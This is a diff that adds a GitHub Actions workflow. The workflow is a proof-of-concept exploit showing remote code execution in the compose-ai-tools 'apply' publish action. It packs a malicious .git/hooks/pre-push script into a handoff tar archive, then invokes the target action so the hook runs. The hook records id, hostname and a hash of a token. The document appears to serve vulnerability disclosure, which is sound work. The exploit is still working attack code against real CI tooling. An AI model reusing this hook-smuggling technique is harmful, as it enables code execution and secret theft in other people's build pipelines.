@@ -1,0 +1,58 @@
+name: zz-horologist-handoff-hook
+
+on:
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
+      actions: read
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
+        with:
+          persist-credentials: false
+
+      - name: Build the handoff the render job would have uploaded
+        run: |
+          set -eux
+          rm -rf stage _compose_preview_handoff
+          mkdir -p stage/_pr_renders/.git/hooks stage/_pr_renders/renders/poc
+          cat > stage/_pr_renders/.git/hooks/pre-push <<'HOOK'
+          #!/bin/bash
+          {
+            echo "RCE: pre-push hook executed"
+            id
+            hostname
+            echo "cwd=$(pwd)"
+            if [ -n "${GITHUB_TOKEN_INLINE:-}" ]; then
+              echo "GITHUB_TOKEN_INLINE present: len=${#GITHUB_TOKEN_INLINE} sha256=$(printf '%s' "$GITHUB_TOKEN_INLINE" | sha256sum | cut -d' ' -f1)"
+            else
+              echo "GITHUB_TOKEN_INLINE not visible"
+            fi
+          } > "$GITHUB_WORKSPACE/rce_proof.txt"
+          exit 0
+          HOOK
+          chmod 755 stage/_pr_renders/.git/hooks/pre-push
+          printf 'not-a-real-png' > stage/_pr_renders/renders/poc/poc.png
+          mkdir -p _compose_preview_handoff
+          tar -cf _compose_preview_handoff/handoff.tar -C stage .
+          rm -rf stage
+          printf '1,0,0,0' > _compose_preview_handoff/_pipelines
+          printf '1' > _compose_preview_handoff/_pr_number
+          tar -tvf _compose_preview_handoff/handoff.tar
+
+      - name: apply publish (same action/ref as the target workflow)
+        uses: yschimke/compose-ai-tools/.github/actions/apply@54d000c1f31b1dbf67d175450bfd441e5a875f48
+        with:
+          phase: publish
+          pr-number: 1
+
+      - name: Show proof
+        if: always()
+        run: |
+          if [ -f rce_proof.txt ]; then cat rce_proof.txt; else echo "NO RCE PROOF"; fi
